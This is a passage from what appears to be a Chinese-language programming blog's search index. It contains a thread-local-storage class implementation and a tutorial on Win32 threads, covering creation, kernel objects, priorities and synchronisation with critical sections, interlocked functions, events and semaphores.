&lt; pData-&gt;nCount) &#123; delete (CNoTrackObject*)pData-&gt;pData[nSlot]; pData-&gt;pData[nSlot] = NULL; &#125; pData = pData-&gt;pNext; &#125; // 将此槽号标识为未被使用 m_pSlotData[nSlot].dwFlags &amp;= ~SLOT_USED; ::LeaveCriticalSection(&amp;m_cs);&#125;inline void* CThreadSlotData::GetThreadValue(int nSlot)&#123; CThreadData* pData = (CThreadData*)::TlsGetValue(m_tlsIndex); if(pData == NULL || nSlot &gt;= pData-&gt;nCount) return NULL; return pData-&gt;pData[nSlot];&#125;void CThreadSlotData::SetValue(int nSlot, void* pValue)&#123; // 通过TLS索引得到我们为线程安排的私有存储空间 CThreadData* pData = (CThreadData*)::TlsGetValue(m_tlsIndex); // 为线程私有数据申请内存空间 if((pData == NULL || nSlot &gt;= pData-&gt;nCount) &amp;&amp; pValue != NULL) &#123; // pData的值为空，表示该线程第一次访问线程私有数据 if(pData == NULL) &#123; pData = new CThreadData; pData-&gt;nCount = 0; pData-&gt;pData = NULL; // 将新申请的内存的地址添加到全局列表中 ::EnterCriticalSection(&amp;m_cs); m_list.AddHead(pData); ::LeaveCriticalSection(&amp;m_cs); &#125; // pData-&gt;pData指向真正的线程私有数据，下面的代码将私有数据占用的空间增长到m_nMax指定的大小 if(pData-&gt;pData == NULL) pData-&gt;pData = (void**)::GlobalAlloc(LMEM_FIXED, m_nMax*sizeof(LPVOID)); else pData-&gt;pData = (void**)::GlobalReAlloc(pData-&gt;pData, m_nMax*sizeof(LPVOID), LMEM_MOVEABLE); // 将新申请的内存初始话为0 memset(pData-&gt;pData + pData-&gt;nCount, 0, (m_nMax - pData-&gt;nCount) * sizeof(LPVOID)); pData-&gt;nCount = m_nMax; ::TlsSetValue(m_tlsIndex, pData); &#125; // 设置线程私有数据的值 pData-&gt;pData[nSlot] = pValue;&#125;void CThreadSlotData::DeleteValues(HINSTANCE hInst, BOOL bAll)&#123; ::EnterCriticalSection(&amp;m_cs); if(!bAll) &#123; // 仅仅删除当前线程的线程局部存储占用的空间 CThreadData* pData = (CThreadData*)::TlsGetValue(m_tlsIndex); if(pData != NULL) DeleteValues(pData, hInst); &#125; else &#123; // 删除所有线程的线程局部存储占用的空间 CThreadData* pData = m_list.GetHead(); while(pData != NULL) &#123; CThreadData* pNextData = pData-&gt;pNext; DeleteValues(pData, hInst); pData = pNextData; &#125; &#125; ::LeaveCriticalSection(&amp;m_cs);&#125;void CThreadSlotData::DeleteValues(CThreadData* pData, HINSTANCE hInst)&#123; // 释放表中的每一个元素 BOOL bDelete = TRUE; for(int i=1; i&lt;pData-&gt;nCount; i++) &#123; if(hInst == NULL || m_pSlotData[i].hInst == hInst) &#123; // hInst匹配，删除数据 delete (CNoTrackObject*)pData-&gt;pData[i]; pData-&gt;pData[i] = NULL; &#125; else &#123; // 还有其它模块在使用，不要删除数据 if(pData-&gt;pData[i] != NULL) bDelete = FALSE; &#125; &#125; if(bDelete) &#123; // 从列表中移除 ::EnterCriticalSection(&amp;m_cs); m_list.Remove(pData); ::LeaveCriticalSection(&amp;m_cs); ::LocalFree(pData-&gt;pData); delete pData; // 清除TLS索引，防止重用 ::TlsSetValue(m_tlsIndex, NULL); &#125;&#125;CThreadSlotData::~CThreadSlotData()&#123; CThreadData *pData = m_list; while(pData != NULL) &#123; CThreadData* pDataNext = pData-&gt;pNext; DeleteValues(pData, NULL); pData = pData-&gt;pNext; &#125; if(m_tlsIndex != (DWORD)-1) ::TlsFree(m_tlsIndex); if(m_pSlotData != NULL) &#123; HGLOBAL hSlotData = ::GlobalHandle(m_pSlotData); ::GlobalUnlock(hSlotData); ::GlobalFree(m_pSlotData); &#125; ::DeleteCriticalSection(&amp;m_cs);&#125;//---------------------------------------CNoTrackObject类---------------------------void* CNoTrackObject::operator new(size_t nSize)&#123; // 申请一块带有GMEM_FIXED和GMEM_ZEROINIT标志的内存 void* p = ::GlobalAlloc(GPTR, nSize); return p;&#125;void CNoTrackObject::operator delete(void* p)&#123; if(p != NULL) ::GlobalFree(p);&#125;//----------------------------CThreadLocalObject 类--------------------------------//CNoTrackObject* CThreadLocalObject::GetData(CNoTrackObject* (*pfnCreateObject)())&#123; if(m_nSlot == 0) &#123; if(_afxThreadData == NULL) _afxThreadData = new(__afxThreadData) CThreadSlotData; m_nSlot = _afxThreadData-&gt;AllocSlot(); &#125; CNoTrackObject* pValue = (CNoTrackObject*)_afxThreadData-&gt;GetThreadValue(m_nSlot); if(pValue == NULL) &#123; // 创建一个数据项 pValue = (*pfnCreateObject)(); // 使用线程私有数据保存新创建的对象 _afxThreadData-&gt;SetValue(m_nSlot, pValue); &#125; return pValue;&#125;CNoTrackObject* CThreadLocalObject::GetDataNA()&#123; if(m_nSlot == 0 || _afxThreadData == 0) return NULL; return (CNoTrackObject*)_afxThreadData-&gt;GetThreadValue(m_nSlot);&#125;CThreadLocalObject::~CThreadLocalObject()&#123; if(m_nSlot != 0 &amp;&amp; _afxThreadData != NULL) _afxThreadData-&gt;FreeSlot(m_nSlot); m_nSlot = 0;&#125;//------------------------------------------","categories":[{"name":"windows程序设计","slug":"windows程序设计","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计/"}],"tags":[]},{"title":"Win32程序的执行单元","slug":"win0003-Win32程序的执行单元","date":"2021-05-19T16:32:15.000Z","updated":"2021-06-24T23:50:19.284Z","comments":true,"path":"2021/05/20/win0003-Win32程序的执行单元/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/20/win0003-Win32程序的执行单元/","excerpt":"","text":"Win32程序的执行单元 线程的创建 线程函数的定义 1DWORD WINAPI ThreadProc(LPVOID lpParam) //线程函数名ThreadProc可以随意的 WINAPI 是一个宏名 1#define WINAPI __stdcall; __stdcall是新标准C/C++函数的调用方法 __stdcall采用自动清栈的方式 __cdecl采用的是手工清栈方式 ThreadProc是一个回调函数 如果没有显式说明的话，函数的调用方法是__cdecl lpParam参数由CreateTHread函数的第四个参数指定 创建新线程的函数是CreateThread 12345678HANDLE CreateThread（LPSECURITY_ATTRIBUTES lpThreadAttributes，//线程的安全属性DWORD dwStackSize， //指定线程堆栈的大小LPTHREAD_START_ROUTINE lpStartAddress，//线程函数的起始地址LPVOID IpParameter， //传递给线程函数的参数DWORD dwCreationFlags， //指定创线程建后是否立即启动DWORD* pThreadld //用于取得内核给新生成的线程分配的线程ID号); 成功：返回新建线程的句柄 IpThreadAttributes参数: 如果指定为NULL表示默认安全属性,且不可继承 如果希望此线程对象句柄可以被继承,则必须设定一个SECURITY_ATTRIBUTES结构,将它的bInheritHandle成员初始化为TRUE 1234567SECURITY ATTRIBUTES sasa.nLength =sizeof(sa)；sa.lpSecurityDescriptor = NULL;sa.binheritHandle=TRUE;//使CreateThread返回的句柄可以被继承//句柄h可以被子进程继承HANDLE h=：CreateThread(&amp;sa，....); dwCreationFlags—创建标志: 如果是0，表示线程被创建后立即开始运行；如果指定为CREATE_SUSPENDED标志，表示线程被创建以后处于挂起（暂停）状态，直到使用ResumeThread函数 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;#include &lt;windows.h&gt;// 线程函数DWORD WINAPI ThreadProc(LPVOID lpParam)&#123; int i = 0; while(i &lt; 20) &#123; printf(\" I am from a thread, count = %d \\n\", i++); &#125; return 0;&#125;int main(int argc, char* argv[])&#123; HANDLE hThread; DWORD dwThreadId; // 创建一个线程 hThread = ::CreateThread ( NULL, // 默认安全属性 NULL, // 默认堆栈大小 ThreadProc, // 线程入口地址（执行线程的函数） NULL, // 传给函数的参数 0, // 指定线程立即运行 &amp;dwThreadId); // 返回线程的ID号 printf(\" Now another thread has been created. ID = %d \\n\", dwThreadId); // 等待新线程运行结束 ::WaitForSingleObject (hThread, INFINITE); ::CloseHandle (hThread); return 0;&#125; INFINITE表示无限时间等待 WaitForSingleObject函数等待新线程运行结束 1234//等待新线程运行结束::WaitForSingleObject（ hThread， //hHandle 要等待的对象的句柄 INFINITE); //dwMilliseconds要等待的时间（以毫秒为单位） WaitForSingleObject函数用于等待指定的对象（hHandle）变成受信状态。参数dwMilliseconds给出了以毫秒为单位的要等待的时间，其值指定为INFINITE表示要等待无限长的时间。 当有下列一种情况发生时函数就会返回： （1）要等待的对象变成受信（signaled）状态。 （2）参数dwMilliseconds指定的时间已过去。 一个可执行对象有两种状态，未受信（nonsignaled）和受信（signaled）状态。 线程对象只有当线程运行结束时才达到受信状态，此时&quot;WaitForSingleObject（hThread，INFINITE）&quot;语句才会返回。 ### 内核句柄对象 线程内核对象就是一个包含了线程状态信息的数据结构。每一次对Create Thread函数的成 功调用，系统都会在内部为新的线程分配一个内核对象。系统提供的管理线程的函数其实就是 依靠访问线程内核对象来实现管理的。 线程内核对象（Thread Kernel Object） 1，线程上下文CONTEXT 每个线程都有它自己的一组CPU寄存器，称为线程的上下文。这组寄存器的值保存在一 个CONTEXT结构里，反映了该线程上次运行时CPU寄存器的状态。 2，使用计数Usage Count Usage Count成员记录了线程内核对象的使用计数，这个计数说明了此内核对象被打开的 次数。 当这个值是0的时候，系统就认为已经没有任何进程在引用此内核对象了，于是线程内核对象就要从内存中撤销。 只要线程没有结束运行， Usage Count的值就至少为1。 在创建一个新的线程时，CreateThread函数返回线程内核对象的句柄，相当于打开一次新创建的内核对象，这也会促使Usage Count的值加1，所以创建一个新的线程后，初始状态下Usage Count的值是2。之后，只要有进程打开此内核对象，就会使Usage Count的值加1。比如当有一个进程调用OpenThread 函数打开这个线程内核对象后， Usage Count的值会再次加1. 12345HANDLE OpenThread(DWORD dwDesiredAccess， //想要的访问权限，可以为THREAD ALL ACCESS等BOOL bInheritHandle， //指定此函数返回的句柄是否可以被子进程继承DWORD dwThreadld //目标线程ID号); //注意， OpenThread函数是Windows 2000及其以上产品的新特性， Windows 98并不支持它。 由于对这个函数的调用会使Usage Count的值加1，所以在使用完它们返回的句柄后一定要调用CloseHandle函数进行关闭。关闭内核对象句柄的操作就会使Usage Count的值减1. 还有一些函数仅仅返回内核对象的伪句柄，并不会创建新的句柄，当然也就不会影响Usage Count的值。如果对这些伪句柄调用CloseHandle函数，那么CloseHandle就会忽略对自己的调用并返回FALSE，对进程和线程来说，这些函数有： 12HANDLE GetCurrentProcess 0； //返回当前进程句柄HANDLE GetCurrentThread 0； //返回当前线程句柄 如果线程结束后Usage Count不为0,会造成内存泄露 当然，线程所在的进程结束后，该进程占用的所有资源都要释放 暂停次数Suspend Count 线程内核对象中的Suspend Count用于指明线程的暂停计数。 当调用CreateProcess （创建进程的主线程）或CreateThread函数时，线程的内核对象就被创建了，它暂停计数被初始化为1 （即处于暂停状态），这可以阻止新创建的线程被调度到CPU中。 因为线程的初始化需要时间，当线程完全初始化好了之后， CreateProcess或CreateThread检查是否传递了CREATE_SUSPENDED标志。如果传递了这个标志，那么这些函数就返回，同时新线程处于暂停状态。 如果尚未传递该标志，那么线程的暂停计数将被递减为0。当线程的暂停计数是0的时候，该线程就处于可调度状态。 暂停次数为1:暂停状态 暂停次数为0:可调度状态 ResuneThread唤醒一个线程 1DWORD ResuneThread (HANDLE hThread); //唤醒一个挂起的线程 该函数减少线程的暂停计数，当计数值减到0的时候，线程被恢复运行。如果调用成功ResumeThread函数返回线程的前一个暂停计数，否则返回OxFFFFFFFF （-1）。 单个线程可以被暂停若干次。如果一个线程被暂停了3次，它必须被唤醒3次才可以分配给一个CPU SuspendThread函数挂起一个线程。 123DWORD WINAPI SuspendThread( _In_HANDLE hThread ); 可调度的（没有处于暂停状态） 大约每经20ms， Windows查看一次当前存在的所有线程内核对象。在这些对象中，只有 一少部分是可调度的（没有处于暂停状态）， Windows选择其中的一个内核对象，将它的 CONTEXT （上下文）装入CPU的寄存器，这一过程称为上下文转换。 退出代码Exit Code 成员Exit Code指定了线程的退出代码，也可以说是线程函数的返回值。在线程运行期间，线程函数还没有返回， Exit Code的值是STILL_ACTIVE。线程运行结束后，系统自动将Exit Code设为线程函数的返回值。可以用GetExitCodeThread函数得到线程的退出代码。 12345678910DWORD dwExitCode；if(GetExitCodeThread(hThread， &amp;dwExitCode))&#123; if(dwExitCode == STILL ACTIVE) &#123; &#125; //目标线程还在运行 else &#123; &#125; //目标线程已经中止，退出代码为dwExitCode&#125;........ GetExitCodeThread得到线程的退出代码 1BOOL GetExitCodeThread( HANDLE hThread, LPDWORD lpExitCode); 是否受信Signaled 成员Signaled指示了线程对象是否为“受信”状态。 线程在运行期间， Signaled的值永远是FALSE，即“未受信”，只有当线程结束以后，系统才把Signaled的值置为TRUE，此时，针对此对象的等待函数就会返回，如上一小节中的WaitForSingleObject函数。 线程结束后,会变成受信状态 线程的终止 一当线程正常终止时，会发生下列事件： 在线程函数中创建的所有C++对象将通过它们各自的析构函数被正确地销毁。 该线程使用的堆栈将被释放。 系统将线程内核对象中Exit Code （退出代码）的值由STILL_ ACTIVE设置为线程函数的返回值。 系统将递减线程内核对象中Usage Code （使用计数）的值。 终止线程的执行有4种方法: （1）线程函数自然退出。当函数执行到return语句返回时， Windows将终止线程的执行。 建议使用这种方法终止线程的执行。 （2）使用ExitThread函数来终止线程，原型如下： 1void ExitThread（ DWORD dwExiCode ）//线程的退出代码 ExitThread函数会中止当前线程的运行，促使系统释放掉所有此线程使用的资源。但是， CCt资源却不能得到正确地清除。 （3）使用TerminateThread函数在一个线程中强制终止另一个线程的执行，原型如下： 1234BOOL TerminateThread(HANDLE hThread， //目标线程句柄DWORD dwExitCode //目标线程的退出代码); （4）使用ExitProcess函数结束进程，这时系统会自动结束进程中所有线程的运行。用这 种方法相当于对每个线程使用TerminateThread函数，所以也应当避免这种情况。 1DECLSPEC_NORETURN VOID ExitProcess(UINT uExitCode); //进程退出代码 线程的优先级 每个线程都要被赋予一个优先级号，取值为0（最低）到31 （最高）。 调用WaitForSingleObject函数就会导致主线程处于不可调度状态，还有在第4章要讨论的GetMessage函数，也会使线程暂停运行。 Windows支持6个优先级类： idle， below normal， normal， above normal，high和real-time. 线程刚被创建时，他的相对优先级总是被设置为normal，若要改变线程的优先级，必须 使用下面这个函数： 1BOOL SetThreadPriority(HANDLE hThread,int nPriority ); hThread参数是目标线程的句柄, nPriority参数定义了线程的优先级,取值如下所示: THREAD_PRIORITY_TIME_CRITICAL Time-critical (实时) THREAD_PRIORITY_HIGHEST_Highest (最高) THREAD_PRIORITY_ABOVE_NORMAL Above normal (高于正常, Windows 98不支持) THREAD_PRIORITY_NORMAL Nornal (正常) THREAD_PRIORITY_BELOW_NORMAL Below normal （低于正常， Windows 98不支持） THREAD_PRIORITY_LOWEST Lowest （最低） THREAD_PRIORITY_IDLE Idle （空闲） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD WINAPI ThreadIdle(LPVOID lpParam)&#123; int i = 0; while(i++&lt;10) printf(\"Idle Thread is running \\n\"); return 0;&#125;DWORD WINAPI ThreadNormal(LPVOID lpParam)&#123; int i = 0; while(i++&lt;10) printf(\" Normal Thread is running \\n\"); return 0;&#125;int main(int argc, char* argv[])&#123; DWORD dwThreadID; HANDLE h[2]; // 创建一个优先级为Idle的线程 h[0] = ::CreateThread(NULL, 0, ThreadIdle, NULL, CREATE_SUSPENDED, &amp;dwThreadID); ::SetThreadPriority(h[0], THREAD_PRIORITY_IDLE); ::ResumeThread(h[0]); // 创建一个优先级为Normal的线程 h[1] = ::CreateThread(NULL, 0, ThreadNormal, NULL, 0, &amp;dwThreadID); // 等待两个线程内核对象都变成受信状态 ::WaitForMultipleObjects( 2, // DWORD nCount 要等待的内核对象的数量 h, // CONST HANDLE *lpHandles 句柄数组 TRUE, // BOOL bWaitAll 指定是否等待所有内核对象变成受信状态 INFINITE); // DWORD dwMilliseconds 要等待的时间 ::CloseHandle(h[0]); ::CloseHandle(h[1]); return 0;&#125;/**/ 创建线程时可以给参数指定CREATE_SUSPENDED，让线程挂起 ResumeThread函数恢复线程运行。 WaitForMultipleObjects函数 123456DWORD WaitForMultipleObjects(DWORD nCount, //数组个数const HANDLE* lpHandles, //句柄数组BOOL bWaitAll, //指定是否等待所有内核对象变成受信状态DWORD dwMilliseconds //要等待的时间); 用于等待多个内核对象，前两个参数分别为要等待的内核对象的个数和句柄数组指针。 如果将第三个参数bWaitAll的值设为TRUE，等待的内核对象全部变成受信状态以后此函数才返回。否则， bWaitAll为0的话，只要等待的内核对象中有一个变成了受信状态， WaitForMultipleObjects就返回，返回值指明了是哪一个内核对象变成了受信状态。 参数bWaitAll为FALSE的时候， WaitForMultpleObjects函数从索引0开始扫描整个句柄 数组，第一个受信的内核对象将终止函数的等待，使函数返回。 下面的代码说明了函数返回值的作用： 12345678910111213141516171819HANDLE h[2];h[0] = hThread1;h[1] = hThread2;DWORD dw = ::WaitForMultipleObjects(2, h, FALSE, 5000);switch(dw)&#123;case WAIT_FAILED: // 调用WaitForMultipleObjects函数失败(句柄无效？) break;case WAIT_TIMEOUT: // 在5秒内没有一个内核对象受信 break;case WAIT_OBJECT_0 + 0: // 句柄h[0]对应的内核对象受信 break;case WAIT_OBJECT_0 + 1: // 句柄h[1]对应的内核对象受信 break;&#125; C/C++运行期库 #include &lt;process.h&gt; 在实际的开发过程中，一般不直接使用windows系统提供的CreateThread函数创建线程， 而是使用C/C++运行期函数_beginthreadex。 _beginthreadex的参数与CreateThread函数是对应的，只是参数名和类型不完全相同，使用的 时候需要强制转化。 12345678unsigned long _beginthreadex(void *security,unsigned stack_size,unsigned (__stdcall *start_address) ( void *),void *arglist,unsigned initflag,unsigned *thrdaddr); 相应地， C/C++运行期库也提供了另一个版本的结束当前线程运行的函数，用于取代 ExitThread函数。 1void _endthreadex（unsigned retval ）； //指定退出代码 这个函数会释放_beginthreadex为保持线程同步而申请的内存空间，然后再调用ExitThread 函数来终止线程。 使用_beginthreadex来创建一个线程 12345678910111213141516171819202122#include&lt;iostream&gt;#include&lt;windows.h&gt;#include &lt;process.h&gt;using namespace std;DWORD WINAPI my(LPVOID lpParam)&#123; cout &lt;&lt; 132 &lt;&lt; endl; cout &lt;&lt; 132 &lt;&lt; endl; cout &lt;&lt; 132 &lt;&lt; endl; return 0;&#125;int main(char *argv[], int argc)&#123; DWORD threadId; HANDLE h = (HANDLE) _beginthreadex(NULL,NULL,(_beginthreadex_proc_type)my,NULL,0, (unsigned*)&amp;threadId); WaitForSingleObject(h, INFINITE); CloseHandle(h); return 0;&#125; 线程同步 临界区对象 当多个线程在同一个进程中执行时，可能有不止一个线程同时执行同一段代码，访问同一段内存中的数据。多个线程同时读共享数据没有问题，但如果同时读和写，情况就不同了。 使用临界区对象 临界区对象是定义在数据段中的一个CRITICAL_SECTION结构， Windows内部使用这个结构记录一些信息，确保在同一时间只有一个线程访问该数据段中的数据。 编程的时候，要把临界区对象定义在想保护的数据段中，然后在任何线程使用此临界区对象之前对它进行初始化。 12void InitializeCriticalSection（LPCRITICAL_SECTION IpCriticalSection）；//指向数据段中定义的CRITICAL_SECTION结构 线程访问临界区中数据的时候，必须首先调用EnterCriticalSection函数，申请进入临界区（文叫关键代码段），在同一时间内， Windows只允许一个线程进入临界区。 所以在申请的时候，如果有另一个线程在临界区的话， EnterCriticalSection函数会一直等待下去，直到其他线程离开临界区才返回。EnterCriticalSection函数用法如下： 1void EnterCriticalSection（ LPCRITICAL_SECTION IpCriticalSection）； 当操作完成的时候，还要将临界区交还给Windows，以便其他线程可以申请使用。这个工作由LeaveCriticalSection函数来完成。 1void LeaveCriticalSection（ LPCRITICAL_SECTION IpCriticalSection）; 当程序不再使用临界区对象的时候，必须使用DeleteCriticalSection函数将它删除。 1void DeleteCriticalSection（ LPCRITICAL_SECTION IpCriticalSection）; 现在使用临界区对象来改写上面有同步问题的计数程序。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;process.h&gt;BOOL g_bContinue = TRUE;int g_nCount1 = 0;int g_nCount2 = 0;CRITICAL_SECTION g_cs; // 对存在同步问题的代码段使用临界区对象UINT __stdcall ThreadFunc(LPVOID);int main(int argc, char* argv[])&#123; UINT uId; HANDLE h[2]; // 初始化临界区对象 ::InitializeCriticalSection(&amp;g_cs); h[0] = (HANDLE)::_beginthreadex(NULL, 0, ThreadFunc, NULL, 0, &amp;uId); h[1] = (HANDLE)::_beginthreadex(NULL, 0, ThreadFunc, NULL, 0, &amp;uId); // 等待1秒后通知两个计数线程结束，关闭句柄 Sleep(1000); g_bContinue = FALSE; ::WaitForMultipleObjects(2, h, TRUE, INFINITE); ::CloseHandle(h[0]); ::CloseHandle(h[1]); // 删除临界区对象 ::DeleteCriticalSection(&amp;g_cs); printf(&quot;g_nCount1 = %d \\n&quot;, g_nCount1); printf(&quot;g_nCount2 = %d \\n&quot;, g_nCount2); return 0;&#125;UINT __stdcall ThreadFunc(LPVOID)&#123; while(g_bContinue) &#123; ::EnterCriticalSection(&amp;g_cs); g_nCount1++; g_nCount2++; ::LeaveCriticalSection(&amp;g_cs); &#125; return 0;&#125; 互锁函数 互锁函数为同步访问多线程共享变量提供了一个简单的机制。如果变量在共享内存，不同 进程的线程也可以使用此机制。 用于互锁的函数有InterlockedIncrement. InterlockedDecrement. InterlockedExchangeAdd， InterlockedExchangePointer等. InterlockedIncrement函数递增（加1）指定的32位变量。这个函数可以阻止其他线程同 时使用此变量，函数原型如下： 12LONG InterlockedIncrement（ LONG volatile* Addend）;//指向要递增的变量 InterlockedDecrement函数同步递减（减1）指定的32位变量，原型如下： 12LONG InterlockedDecrement( LONG volatile* Addend);//指向要递减的变量 123456789101112131415161718192021222324252627282930313233343536373839404142434445///////////////////////////////////////////////////////////////// InterlockDemo.cpp文件#include &lt;stdio.h&gt;#include &lt;windows.h&gt; #include &lt;process.h&gt;int g_nCount1 = 0;int g_nCount2 = 0;BOOL g_bContinue = TRUE;UINT __stdcall ThreadFunc(LPVOID);int main(int argc, char* argv[])&#123; UINT uId; HANDLE h[2]; h[0] = (HANDLE)::_beginthreadex(NULL, 0, ThreadFunc, NULL, 0, &amp;uId); h[1] = (HANDLE)::_beginthreadex(NULL, 0, ThreadFunc, NULL, 0, &amp;uId); // 等待1秒后通知两个计数线程结束，关闭句柄 Sleep(1000); g_bContinue = FALSE; ::WaitForMultipleObjects(2, h, TRUE, INFINITE); ::CloseHandle(h[0]); ::CloseHandle(h[1]); printf(\"g_nCount1 = %d \\n\", g_nCount1); printf(\"g_nCount2 = %d \\n\", g_nCount2); return 0;&#125;UINT __stdcall ThreadFunc(LPVOID)&#123; while(g_bContinue) &#123; ::InterlockedIncrement((long*)&amp;g_nCount1); ::InterlockedIncrement((long*)&amp;g_nCount2); &#125; return 0;&#125; 事件内核对象 多线程程序设计大多会涉及线程间相互通信。 事件对象（event）是一种抽象的对象，它也有未受信（nonsignaled）和受信（signaled）两种状态，编程人员也可以使用WaitForSingleObject函数等待其变成受信状态。 事件对象包含3个成员： nUsageCount （使用计数）、bManualReset （是否人工重置）和 bSignaled （是否受信）。 成员nUsagecount记录当前的使用计数，当使用计数为0的时候，Windows就会销毁此内核对象占用的资源； 成员bManualReset指定在一个事件内核对象上等待的函数返回之后， Windows是否重置这个对象为未受信状态； 成员bsignaled指定当前事件内核对象是否受信。 如果想使用事件对象，需要首先用CreateEvent函数去创建它，初始状态下， nUsageCount 的值为1. 12345HANDLE CreateEvent（LPSECURITY_ATTRIBUTES IpEventAttributes， //用来定义事件对象的安全属性BOOL bManualReset, //指定是否需要手动重置事件对象为未受信状态。BOOL bInitialState，//指定事件对象创建时的初始状态LPCWSTR IpName）;//事件对象的名称 参数bManualReset对应着内核对象中的bManualReset成员。 自动重置（auto-reset）和人工重置（manual-reset）是事件内核对象两种不同的类型。 当一个人工重置的事件对象受信以后，所有等待在这个事件上的线程都会变为可调度状态(暂停次数为0)； 可是当一个自动重置的事件对象受信以后， Windows仅允许一个等待在该事件上的线程变成可调度状态，然后就自动重置此事件对象为未受信状态。 blnitialState参数对应着bSignaled成员。 将它设为TRUE，则表示事件对象创建时的初始化状态为受信(结束)（bSignaled =TRUE）；设为FALSE时，状态为未受信(未结束)（bSignaled =FALSE）。 IpName参数用来指定事件对象的名称。为事件对象命名是为了在其他地方（比如，其他 进程的线程中）使用OpenEvent或CreateEvent函数获取此内核对象的句柄。 1234HANDLE OpenEvent (DWORD dwDesiredAccess, //指定想要的访问权限BOOL blnheritHandle, //指定返回句柄是否可被继承LPCWSTR IpName); //要打开的事件对象的名称 系统创建或打开一个事件内核对象后，会返回事件的句柄。当编程人员不使用此内核对象的时候，应该调用CloseHandle函数释放它占用的资源。 事件对象被建立后，程序可以通过SetEvent和ResetEvent函数来设置它的状态。 12BOOL SetEvent(HANDLE hEvent ); //将事件状态设为&quot;受信(sigaled) &quot;;BOOL ResetEvent(HANDLE hEvent); //将事件状态设为&quot;未受信(nonsigaled) &quot;; 通常情况下，为一个自动重置类型的事件对象调用ResetEvent函数是不必要的，因为Windows会自动重置此事件对象。 下面例子中，主线程通过将事件状态设为“受信”来通知子线程开始工作。这是事件内核对 象一个很重要的用途，示例代码如下： 12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;process.h&gt;HANDLE g_hEvent;UINT __stdcall ChildFunc(LPVOID);int main(int argc, char* argv[])&#123; HANDLE hChildThread; UINT uId; // 创建一个自动重置的（auto-reset events），未受信的（nonsignaled）事件内核对象 g_hEvent = ::CreateEvent(NULL, FALSE, FALSE, NULL); hChildThread = (HANDLE)::_beginthreadex(NULL, 0, ChildFunc, NULL, 0, &amp;uId); // 通知子线程开始工作 printf(\"Please input a char to tell the Child Thread to work: \\n\"); getchar(); ::SetEvent(g_hEvent); // 等待子线程完成工作，释放资源 ::WaitForSingleObject(hChildThread, INFINITE); printf(\"All the work has been finished. \\n\"); ::CloseHandle(hChildThread); ::CloseHandle(g_hEvent); return 0;&#125;UINT __stdcall ChildFunc(LPVOID)&#123; ::WaitForSingleObject(g_hEvent, INFINITE); printf(\" Child thread is working...... \\n\"); ::Sleep(5*1000); // 暂停5秒，模拟真正的工作 return 0;&#125; 信号量内核对象 信号量（Semaphore）内核对象对线程的同步方式与前面几种方法不同，它允许多个线程 在同一时刻访问同一资源，但是需要限制在同一时刻访问此资源的最大线程数目。 在用CreateSemaphore函数创建信号量时，即要同时指出允许的最大资源计数和当前可用资源计数。 一般是将当前可用资源计数设置为最大资源计数，每增加一个线程对共享资源的访问，当前可 用资源计数就会减1，只要当前可用资源计数是大于0的，就可以发出信号量信号。 但是当前可用计数减小到0时则说明当前占用资源的线程数已经达到了所允许的最大数目，不能再允许 其他线程的进入，此时的信号量信号将无法发出。 线程在处理完共享资源后，应在离开的同时通过ReleaseSemaphore函数将当前可用资源计数加1，在任何时候当前可用资源计数决不可能大于最大资源计数。 以箭头和白色箭头表示共享资源所允许的最大资源计数和当前可用资源计数。 黑色箭头表示已经访问的资源个数。当可用资源为0时，其他线程不能进入，直到可用资源大于0时，其他线程才可访问 信号量也被称作Dikstrait数器。 使用信号量内核对象进行线程同步主要会用到CreateSemaphore，OpenSemaphore、ReleaseSemaphore、 WaitForSingleObject和WaitForMultipleObjects等函数。 其中CreateSemaphore用来创建一个信号量内核对象，其函数原型为： 123456HANDLE CreateSemaphore(LPSECURITY_ATTRIBUTES IpSemaphoreAttributes,//安全属性指针LONG IInitialCount,//初始计数LONG IMaximumCount,//最大计数LPCTSTR IpName//对象名指针); 参数IMaximumCount是一个有符号32位值，定义了允许的最大资源计数，最大取值不能 超过4294967295， IpName参数可以为创建的信号量定义一个名字，由于其创建的是一个内核 对象，因此在其他进程中可以通过该名字而得到此信号量。 OpenSemaphore （）函数即可用来根据信号量名打开在其他进程中创建的信号量，函数原型如下： 12345HANDLE OpenSemaphore(DWORD dwDesiredAccess, //访问标志BOOL bInheritHandle, //继承标志LPCTSTR IpName //信号量名); 在线程离开对共享资源的处理时，必须通过ReleaseSemaphore来增加当前可用资源计数。否则，将会出现当前正在处理共享资源的实际线程数并没有达到要限制的数值，而其他线程却因为当前可用资源计数为0而仍无法进入的情况。 ReleaseSemaphore的函数原型为： 12345BOOL ReleaseSemaphore(HANDLE hSemaphore, //信号量句柄LONG IReleaseCount, //计数递增数量LPLONG IpPreviousCount //先前计数); 该函数将IReleaseCount中的值添加给信号量的当前资源计数，一般将IReleaseCount设置 为1，如果需要也可以设置其他的值。 WaitForSingleObject和WaitForMultipleObjects主要用在试图进入共享资源的线程函数入口处，主要用来判断信号量的当前可用资源计数是否允许本线程的进入。 只有在当前可用资源计数值大于0时，被监视的信号量内核对象才会得到通知。 信号量的使用特点使甚更适用于对Socket （套接字）程序中线程的同步。 例如，网络上的HTTP服务器要对同一时间内访问同一页面的用户数加以限制，这时可以为没一个用户对服务 器的页面请求设置一个线程，而页面则是待保护的共享资源，通过使用信号量对线程的同步作用可以确保在任一时刻无论有多少用户对某一页面进行访问，只有不大于设定的最大用户数目的线程能够进行访问，而其他的访问企图则被挂起，只有在有用户退出对此页面的访问后才有可能进入。 123456789101112131415161718192021222324252627282930313233343536373839404142#include&lt;iostream&gt;#include&lt;windows.h&gt;#include&lt;process.h&gt; //使用_beginthreadex创建线程需要包含此文件using namespace std;//信号量对象句柄HANDLE hSemaphore;UINT WINAPI myThread(LPVOID pParam) &#123; //试图进入信号量关口 WaitForSingleObject(hSemaphore, INFINITE); for (int i = 0; i &lt; 5; i++) &#123; cout &lt;&lt; i &lt;&lt; endl; &#125; //释放信号量计数 ReleaseSemaphore(hSemaphore,1,NULL); return 0;&#125;int main(char *argv[], int argc)&#123; //创建信号量对象 hSemaphore = CreateSemaphore(NULL, 1, 1, NULL); HANDLE h1 = (HANDLE) _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)myThread, 